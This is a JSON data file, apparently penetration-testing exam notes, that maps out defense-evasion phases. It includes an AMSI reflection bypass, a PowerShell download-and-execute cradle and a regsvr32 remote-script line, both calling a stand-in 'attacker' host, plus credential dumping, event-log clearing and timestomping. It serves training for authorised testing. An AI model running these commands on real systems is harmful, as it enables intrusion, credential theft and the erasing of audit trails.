@@ -1,0 +1,92 @@
+{
+  "id": "defense-evasion-argha-dey-methodology",
+  "zone": "defense-evasion",
+  "name": "Argha Dey Defense Evasion Methodology",
+  "source": "Argha Dey CPENT Notes (94% scorer)",
+  "description": "Techniques for evading antivirus, EDR, firewalls, and application whitelisting during penetration testing. Covers AMSI bypass, PowerShell obfuscation, LOLBins, and living-off-the-land techniques.",
+  "examHabits": [
+    "PowerShell execution policy bypass: -exec bypass or -ep bypass",
+    "Use Invoke-Obfuscation for multi-layer obfuscation of PowerShell payloads",
+    "Reflective loading: load Mimikatz/PE into memory via Rubeus or SafetyKatz to avoid disk writes",
+    "LOLBins: use regsvr32, rundll32, or mshta for executing payloads without writing to disk",
+    "Check AMSI before running any PowerShell — patch amsiInitFailed if needed"
+  ],
+  "quickRef": "powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload'); amsi bypass; Invoke-Obfuscation",
+  "steps": [
+    {
+      "phase": "Phase 1 - AMSI Bypass",
+      "tools": ["powershell", "mimikatz"],
+      "decisionPoints": [
+        {
+          "condition": "PowerShell AMSI scanning active",
+          "action": "Bypass via reflection: [Ref].Assembly.GetType('System.Management.Automation.'+'AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+          "fallback": "Use encrypted command: powershell -enc <b64_encoded_payload> where payload is AMSI-bypassed"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 2 - Obfuscation & Encoding",
+      "tools": ["invoke-obfuscation", "certutil", "powershell"],
+      "decisionPoints": [
+        {
+          "condition": "AV signature detection on payloads",
+          "action": "Invoke-Obfuscation — choose token, string, or command encoding",
+          "fallback": "Manual: break strings into parts, use char codes, Base64 encode"
+        },
+        {
+          "condition": "Network-based detection (IDS/IPS)",
+          "action": "Use HTTPS for C2, encode traffic, use DNS tunneling",
+          "fallback": "HTTP proxy through chisel/ligolo to blend with normal traffic"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 3 - Living Off The Land Binaries (LOLBins)",
+      "tools": ["runas", "regsvr32", "rundll32", "mshta"],
+      "decisionPoints": [
+        {
+          "condition": "Need to execute code without downloading binaries",
+          "action": "regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll",
+          "fallback": "rundll32 javascript:eval(...).Process"
+        },
+        {
+          "condition": "Application whitelisting enforced",
+          "action": "Check LOLBAS project for approved binaries that can execute scripts",
+          "fallback": "Use signed binaries to load unsigned payloads via Reflective DLL injection"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 4 - EDR Evasion",
+      "tools": ["mimikatz", "rubeus", "safetykatz"],
+      "decisionPoints": [
+        {
+          "condition": "EDR hooking on syscalls",
+          "action": "Use direct syscall (syscaller) or unhook via DLL unmapping",
+          "fallback": "Reflective loading: load tools directly into memory without CreateProcess"
+        },
+        {
+          "condition": "Need to dump credentials without EDR catching",
+          "action": "SafetyKatz — only loads necessary modules into memory",
+          "fallback": "Rubeus — kerberoasting without touching LSASS"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 5 - Log Evasion & Cleanup",
+      "tools": ["mimikatz", "powershell"],
+      "decisionPoints": [
+        {
+          "condition": "Windows event logs contain traces",
+          "action": "mimikatz # event::clear — removes all security event log entries",
+          "fallback": "wevtutil cl Security — clear via command line"
+        },
+        {
+          "condition": "Need forensic artifact removal",
+          "action": "Clear prefetch, shimcache, and AMCache entries",
+          "fallback": "Timestomp file creation/access times with powershell or timestomp.exe"
+        }
+      ]
+    }
+  ]
+}
